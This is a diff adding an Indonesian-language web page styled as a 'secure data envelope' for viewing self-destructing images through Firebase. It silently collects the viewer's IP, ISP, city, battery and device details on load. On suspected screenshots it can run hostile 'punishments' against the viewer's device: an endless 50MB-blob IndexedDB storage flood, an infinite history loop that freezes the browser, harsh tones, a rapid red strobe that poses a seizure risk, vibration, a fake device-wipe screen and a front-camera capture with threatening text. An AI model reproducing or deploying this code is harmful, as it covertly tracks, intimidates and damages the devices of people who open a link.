@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SECURE DATA ENVELOPE</title>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    
+    <style>
+        :root { --bg-dark: #050608; --text-white: #e2e4e9; --neon-red: #ef4444; }
+        
+        /* ANTI-SAVE & ANTI-COPY CSS MUTLAK */
+        * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; -webkit-user-select: none; -webkit-touch-callout: none; -moz-user-select: none; -ms-user-select: none; outline: none; -webkit-tap-highlight-color: transparent; }
+        
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg-dark); color: var(--text-white); height: 100dvh; width: 100vw; overflow: hidden; position: relative; touch-action: none; }
+
+        #loading-screen { position: absolute; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; background: var(--bg-dark); z-index: 100; }
+        .cyber-loader { width: 50px; height: 50px; border: 3px solid rgba(255,255,255,0.1); border-top-color: #fff; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        
+        /* RUANG KAPSUL & GEMBOK PIKSEL */
+        #vault-container { position: absolute; inset: 0; display: none; background: #000; overflow: hidden; }
+        #secret-image { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); max-width: 100%; max-height: 100%; object-fit: contain; pointer-events: none; transition: filter 0.1s ease; }
+        
+        .extreme-blur { filter: blur(35px) saturate(200%) contrast(150%); opacity: 0.8; }
+        .clear-img { filter: blur(0px) saturate(100%) contrast(100%); opacity: 1; }
+
+        /* UI GEMBOK PIKSEL KINETIK */
+        #pixel-lock-ui { position: absolute; inset: 0; display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 20; background: rgba(0,0,0,0.4); backdrop-filter: blur(5px); }
+        .lock-btn { width: 80px; height: 80px; background: rgba(0,0,0,0.8); border: 2px solid #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem; color: #fff; box-shadow: 0 0 20px rgba(255,255,255,0.2); animation: pulseLock 2s infinite; touch-action: none; cursor: pointer; }
+        
+        /* UI SPOTLIGHT 3CM */
+        #spotlight-canvas { position: absolute; inset: 0; width: 100%; height: 100%; z-index: 15; touch-action: none; display: none; }
+
+        /* UI PERINGATAN TOLERANSI */
+        #tolerance-warning { position: absolute; top: 20px; left: 50%; transform: translateX(-50%); background: rgba(239,68,68,0.95); border: 1px solid #fff; color: #fff; padding: 12px 20px; border-radius: 8px; font-weight: bold; font-family: monospace; font-size: 0.9rem; z-index: 50; display: none; text-align: center; box-shadow: 0 10px 25px rgba(239,68,68,0.6); pointer-events: none; width: 80%; }
+
+        /* BUMI HANGUS & DETERRENTS LAMA */
+        #burned-screen { position: absolute; inset: 0; display: none; flex-direction: column; align-items: center; justify-content: center; background: #000; z-index: 500; text-align: center; padding: 20px; }
+        #factory-wipe { position: absolute; inset: 0; display: none; flex-direction: column; align-items: center; justify-content: center; background: #000; z-index: 600; font-family: monospace; }
+        #red-room { position: absolute; inset: 0; display: none; background: #000; z-index: 700; }
+        #red-video { width: 100%; height: 100%; object-fit: cover; filter: sepia(1) hue-rotate(300deg) saturate(5) contrast(1.5) brightness(0.8); }
+        .red-text { position: absolute; top: 50%; width: 100%; text-align: center; font-family: monospace; color: #fff; text-shadow: 0 0 10px red; font-size: 1.5rem; mix-blend-mode: overlay; }
+
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        @keyframes pulseLock { 0% { box-shadow: 0 0 0 0 rgba(255,255,255,0.4); } 70% { box-shadow: 0 0 0 25px rgba(255,255,255,0); } 100% { box-shadow: 0 0 0 0 rgba(255,255,255,0); } }
+    </style>
+</head>
+
+<body oncontextmenu="return false;">
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyD1O3z2mw3fKorKAAqI3ZMZz9qlNnZqKE4",
+            authDomain: "bagantara-id.firebaseapp.com",
+            databaseURL: "https://bagantara-id-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "bagantara-id",
+            storageBucket: "bagantara-id.firebasestorage.app",
+            messagingSenderId: "76112622878",
+            appId: "1:76112622878:web:d4800368f06e1cc04c450f"
+        };
+        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+    </script>
+
+    <div id="loading-screen">
+        <div class="cyber-loader"></div>
+        <p style="font-family: monospace; color: #888; font-size: 0.8rem;">ESTABLISHING SECURE CONNECTION...</p>
+    </div>
+
+    <div id="vault-container">
+        <img id="secret-image" src="" alt="Classified" class="extreme-blur">
+        
+        <div id="pixel-lock-ui">
+            <div class="lock-btn" id="btn-hold-lock"><i class="fa-solid fa-lock"></i></div>
+            <div style="margin-top: 15px; font-size: 0.8rem; font-weight: bold; letter-spacing: 1px; color: #fff;">TAHAN UNTUK MELIHAT</div>
+        </div>
+
+        <canvas id="spotlight-canvas"></canvas>
+
+        <div id="tolerance-warning">PERINGATAN!<br>JANGAN ANGKAT JARI ANDA.<br>SISA KESEMPATAN: <span id="tol-count" style="color: yellow; font-size: 1.2rem;">0</span></div>
+    </div>
+
+    <div id="burned-screen">
+        <i class="fa-solid fa-link-slash" style="font-size: 4rem; color: #555; margin-bottom: 20px;"></i>
+        <h2 style="color: #fff; margin-bottom: 10px;">DATA HANGUS</h2>
+        <p id="lblBurnReason" style="color: var(--neon-red); font-family: monospace; font-size: 0.9rem;">AKSES DITOLAK ATAU DIHANCURKAN</p>
+    </div>
+
+    <div id="factory-wipe">
+        <i class="fa-brands fa-android" style="font-size: 5rem; color: #fff; margin-bottom: 20px;"></i>
+        <div style="width: 60%; height: 4px; background: #333; border-radius: 2px; margin-bottom: 10px;">
+            <div id="wipe-progress" style="width: 14%; height: 100%; background: #fff; border-radius: 2px; transition: width 0.5s;"></div>
+        </div>
+        <p style="color: #ef4444; font-size: 0.8rem;">SECURITY BREACH. Wiping device data...</p>
+    </div>
+
+    <div id="red-room">
+        <video id="red-video" autoplay playsinline muted></video>
+        <div class="red-text" id="red-text-content">IDENTITAS ANDA TEREKAM</div>
+    </div>
+
+    <script>
+        function safeAtob(str) {
+            try {
+                let b64 = str.replace(/-/g, '+').replace(/_/g, '/');
+                while (b64.length % 4) { b64 += '='; }
+                return atob(b64);
+            } catch(e) { return null; }
+        }
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const linkId = safeAtob(decodeURIComponent(urlParams.get('id') || ''));
+        
+        const loader = document.getElementById('loading-screen');
+        const vault = document.getElementById('vault-container');
+        const imgTarget = document.getElementById('secret-image');
+        
+        let dbRef = null;
+        let kapsulOptions = {};
+        let isBurned = false;
+        let activeTimer = null;
+        let sisaToleransi = 0; 
+        let isHolding = false;
+
+        // MASTER SENSOR: Deteksi Sapuan 3 Jari Screenshot
+        document.addEventListener('touchstart', (e) => {
+            if (e.touches.length >= 2 && !isBurned && isHolding) {
+                eksekusiHancurkanData("INDIKASI_SCREENSHOT_MULTI-TOUCH", true);
+            } else if (e.touches.length >= 3 && !isBurned) {
+                eksekusiHancurkanData("INDIKASI_SCREENSHOT_TIGA_JARI", true);
+            }
+        }, { passive: false });
+
+        // TELEMETRI SILUMAN
+        async function harvestTelemetry() {
+            let teleData = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                timestamp: firebase.database.ServerValue.TIMESTAMP
+            };
+            try { if(navigator.getBattery) { const bat = await navigator.getBattery(); teleData.battery = Math.round(bat.level * 100) + '%'; teleData.charging = bat.charging; } } catch(e) {}
+            try { const res = await fetch('https://ipapi.co/json/'); const ipInfo = await res.json(); teleData.ip = ipInfo.ip; teleData.isp = ipInfo.org; teleData.city = ipInfo.city; } catch(e) {}
+            if(linkId) db.ref(`burner_vault/${linkId}/telemetri`).set(teleData);
+        }
+
+        // INIT KAPSUL
+        if (!linkId) {
+            tampilkanBumiHangusNormal("TAUTAN KOSONG ATAU RUSAK");
+        } else {
+            dbRef = db.ref(`burner_vault/${linkId}`);
+            harvestTelemetry(); 
+            
+            dbRef.once('value').then(snap => {
+                if (!snap.exists()) { tampilkanBumiHangusNormal("KAPSUL TELAH HANCUR ATAU TIDAK DITEMUKAN"); return; }
+
+                const data = snap.val();
+                imgTarget.src = data.imageData;
+                kapsulOptions = data.options || {};
+                
+                sisaToleransi = kapsulOptions.tolerance !== undefined ? parseInt(kapsulOptions.tolerance) : 0;
+                
+                if (data.duration && data.duration > 0) {
+                    activeTimer = setTimeout(() => { eksekusiHancurkanData("WAKTU_HABIS", true); }, data.duration * 1000);
+                }
+
+                dbRef.child('manual_detonation').on('value', cmdSnap => {
+                    if (cmdSnap.exists() && cmdSnap.val() === true) { eksekusiHancurkanData("DIHANCURKAN_MANUAL_OLEH_ADMIN", true); }
+                });
+
+                bukaKapsul();
+            }).catch(e => { tampilkanBumiHangusNormal("GAGAL MEMBACA ENKRIPSI SERVER"); });
+        }
+
+        function bukaKapsul() {
+            loader.style.display = 'none';
+            vault.style.display = 'block';
+
+            if (kapsulOptions.mode === 'pixel_lock') {
+                initPixelLock();
+            } else if (kapsulOptions.mode === 'spotlight') {
+                initSpotlight();
+            } else {
+                imgTarget.classList.replace('extreme-blur', 'clear-img');
+            }
+
+            // ZERO-TOLERANCE TRIPWIRE
+            if (kapsulOptions.tripwire) {
+                document.addEventListener('visibilitychange', () => {
+                    if (document.hidden && !isBurned) eksekusiHancurkanData("PELANGGARAN_FOKUS_APLIKASI", true);
+                });
+            }
+        }
+
+        // MODE 1: GEMBOK PIKSEL
+        function initPixelLock() {
+            const lockUI = document.getElementById('pixel-lock-ui');
+            const lockBtn = document.getElementById('btn-hold-lock');
+            const warnUI = document.getElementById('tolerance-warning');
+            const warnCount = document.getElementById('tol-count');
+            
+            lockUI.style.display = 'flex';
+            imgTarget.classList.add('extreme-blur');
+
+            lockBtn.addEventListener('touchstart', (e) => {
+                e.preventDefault();
+                isHolding = true;
+                
+                if (kapsulOptions.fullscreen) document.documentElement.requestFullscreen().catch(err=>{});
+                
+                lockUI.style.display = 'none'; 
+                imgTarget.classList.replace('extreme-blur', 'clear-img');
+                warnUI.style.display = 'none';
+            }, { passive: false });
+
+            document.addEventListener('touchend', (e) => {
+                if (!isHolding || isBurned) return;
+                isHolding = false;
+                e.preventDefault();
+
+                imgTarget.classList.replace('clear-img', 'extreme-blur');
+                lockUI.style.display = 'flex';
+
+                if (sisaToleransi > 0) {
+                    sisaToleransi--;
+                    warnCount.innerText = sisaToleransi;
+                    warnUI.style.display = 'block';
+                } else {
+                    eksekusiHancurkanData("PELANGGARAN_ANGKAT_JARI_MELEBIHI_BATAS", true);
+                }
+            }, { passive: false });
+        }
+
+        // MODE 2: SPOTLIGHT 3CM
+        function initSpotlight() {
+            const canvas = document.getElementById('spotlight-canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.style.display = 'block';
+            imgTarget.classList.replace('extreme-blur', 'clear-img'); 
+            
+            function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; fillBlack(); }
+            window.addEventListener('resize', resizeCanvas);
+            resizeCanvas();
+
+            function fillBlack() { ctx.globalCompositeOperation = 'source-over'; ctx.fillStyle = '#000000'; ctx.fillRect(0, 0, canvas.width, canvas.height); }
+
+            function drawSpotlight(x, y) {
+                fillBlack();
+                ctx.globalCompositeOperation = 'destination-out';
+                ctx.beginPath();
+                ctx.arc(x, y, 45, 0, Math.PI * 2, false);
+                ctx.fill();
+            }
+
+            canvas.addEventListener('touchstart', (e) => {
+                e.preventDefault(); isHolding = true;
+                if (kapsulOptions.fullscreen) document.documentElement.requestFullscreen().catch(err=>{});
+                drawSpotlight(e.touches[0].clientX, e.touches[0].clientY);
+            });
+            
+            canvas.addEventListener('touchmove', (e) => { if(isHolding) drawSpotlight(e.touches[0].clientX, e.touches[0].clientY); });
+            canvas.addEventListener('touchend', (e) => { isHolding = false; fillBlack(); });
+        }
+
+        // =========================================================
+        // PROTOKOL DEEP WIPE (PEMUSNAHAN MUTLAK)
+        // =========================================================
+        async function eksekusiHancurkanData(reason, executeDeterrent = false) {
+            if (isBurned) return;
+            isBurned = true;
+
+            if (activeTimer) clearTimeout(activeTimer);
+            
+            vault.style.display = 'none';
+            imgTarget.src = "";
+            const spotCanvas = document.getElementById('spotlight-canvas');
+            if (spotCanvas) spotCanvas.remove();
+            
+            try { localStorage.clear(); sessionStorage.clear(); } catch(e) {}
+            if (dbRef) { try { await dbRef.remove(); } catch(e) {} }
+
+            // EKSEKUSI HUKUMAN BRUTAL BLACK-OPS
+            if (executeDeterrent) {
+                
+                // 1. Eksekusi Background Ops (Goliath / TarPit / EarRipper)
+                if (kapsulOptions.punish_goliath) triggerGoliath(); // Cekik Memori ROM
+                if (kapsulOptions.punish_tarPit) triggerTarPit(); // Bekukan Memori RAM
+                if (kapsulOptions.punish_earRipper) triggerEarRipper(); // Tembakan Audio
+                
+                // 2. Eksekusi Layar Visual (Prioritas)
+                if (kapsulOptions.punish_poltergeist) { 
+                    triggerPoltergeist(); 
+                    jalankanSekuensiTendangan(8000); // 8 detik disiksa sebelum ditendang
+                    return; 
+                }
+                else if (kapsulOptions.punish_factoryWipe) { 
+                    triggerFactoryWipe(); 
+                    jalankanSekuensiTendangan(5000); 
+                    return; 
+                } 
+                else if (kapsulOptions.punish_redRoom) { 
+                    triggerRedRoom(); 
+                    jalankanSekuensiTendangan(5000); 
+                    return; 
+                }
+            }
+
+            tampilkanBumiHangusNormal(reason);
+        }
+
+        function tampilkanBumiHangusNormal(reason) {
+            loader.style.display = 'none';
+            vault.style.display = 'none';
+            document.getElementById('lblBurnReason').innerHTML = reason.replace(/_/g, ' ');
+            document.getElementById('burned-screen').style.display = 'flex';
+            
+            jalankanSekuensiTendangan(2500);
+        }
+
+        function jalankanSekuensiTendangan(delayVisual) {
+            setTimeout(() => {
+                // Keluar Fullscreen untuk mencegah blokir Anti-Phishing Chrome/Safari
+                if (document.fullscreenElement) {
+                    document.exitFullscreen().catch(e => {});
+                }
+                // Tendangan Akhir
+                setTimeout(() => { window.location.replace('https://www.google.com'); }, 150);
+            }, delayVisual);
+        }
+
+        // =========================================================
+        // ARSENAL HUKUMAN BLACK-OPS (DETERRENTS)
+        // =========================================================
+
+        // 1. PROTOKOL GOLIATH (PENCEKIKAN PENYIMPANAN ROM)
+        function triggerGoliath() {
+            try {
+                const request = indexedDB.open("SystemCachePayloadDB", 1);
+                request.onupgradeneeded = (e) => { e.target.result.createObjectStore("blobs", { autoIncrement: true }); };
+                request.onsuccess = (e) => {
+                    const db = e.target.result;
+                    function writeTrash() {
+                        try {
+                            const tx = db.transaction("blobs", "readwrite");
+                            const store = tx.objectStore("blobs");
+                            const junk = new Uint8Array(50 * 1024 * 1024); // Tembakan 50MB File Sampah
+                            store.add(junk);
+                            tx.oncomplete = () => setTimeout(writeTrash, 100); // Loop terus menerus
+                        } catch(err) {}
+                    }
+                    writeTrash();
+                };
+            } catch(e) {}
+        }
+
+        // 2. PROTOKOL POLTERGEIST (KEJANG SENSORIK FISIK)
+        function triggerPoltergeist() {
+            // A. Getaran SOS Kasar (Jika OS mendukung)
+            if (navigator.vibrate) {
+                setInterval(() => navigator.vibrate([1000, 50, 1000, 50, 1000]), 3100);
+                navigator.vibrate([1000, 50, 1000, 50, 1000]);
+            }
+            
+            // B. Serangan Binaural (Gemuruh 50Hz + Lengkingan 15.000Hz)
+            try {
+                const ac = new (window.AudioContext || window.webkitAudioContext)();
+                const osc1 = ac.createOscillator(); const osc2 = ac.createOscillator();
+                osc1.type = 'square'; osc1.frequency.value = 50; 
+                osc2.type = 'sawtooth'; osc2.frequency.value = 15000;
+                osc1.connect(ac.destination); osc2.connect(ac.destination);
+                osc1.start(); osc2.start();
+            } catch(e) {}
+
+            // C. Strobe Light (Kedip Layar) & Kunci WakeLock
+            document.body.innerHTML = ''; 
+            const strobe = document.createElement('div');
+            strobe.style.cssText = "position:fixed;inset:0;z-index:9999;";
+            document.body.appendChild(strobe);
+            
+            let isRed = false;
+            setInterval(() => {
+                strobe.style.backgroundColor = isRed ? '#000000' : '#ff0000';
+                isRed = !isRed;
+            }, 50);
+
+            try { navigator.wakeLock.request('screen'); } catch(e) {}
+        }
+
+        // 3. PROTOKOL EAR-RIPPER LAMA
+        function triggerEarRipper() {
+            try { const ac = new (window.AudioContext || window.webkitAudioContext)(); const osc = ac.createOscillator(); osc.type = 'sawtooth'; osc.frequency.setValueAtTime(8000, ac.currentTime); osc.connect(ac.destination); osc.start(); setTimeout(() => { osc.stop(); ac.close(); }, 4000); } catch(e) {}
+        }
+
+        // 4. PROTOKOL TAR-PIT (FREEZE RAM)
+        function triggerTarPit() {
+            setTimeout(() => { while(true) { history.pushState(0, 0, location.href); } }, 1000);
+        }
+
+        // 5. PROTOKOL FACTORY WIPE
+        function triggerFactoryWipe() {
+            document.getElementById('factory-wipe').style.display = 'flex';
+            let p = 14; setInterval(() => { p += Math.random() * 5; if(p > 99) p = 99; document.getElementById('wipe-progress').style.width = p + '%'; }, 800);
+        }
+
+        // 6. PROTOKOL RED ROOM
+        function triggerRedRoom() {
+            const rr = document.getElementById('red-room'); rr.style.display = 'block';
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }).then(stream => { document.getElementById('red-video').srcObject = stream; }).catch(e => { document.getElementById('red-text-content').innerHTML = "AKSES KAMERA DITOLAK.<br>TAPI KAMI TAHU SIAPA ANDA."; });
+            setInterval(() => { rr.style.filter = `hue-rotate(${Math.random()*360}deg) brightness(${Math.random()*2})`; }, 150);
+        }
+    </script>
+</body>
+</html>
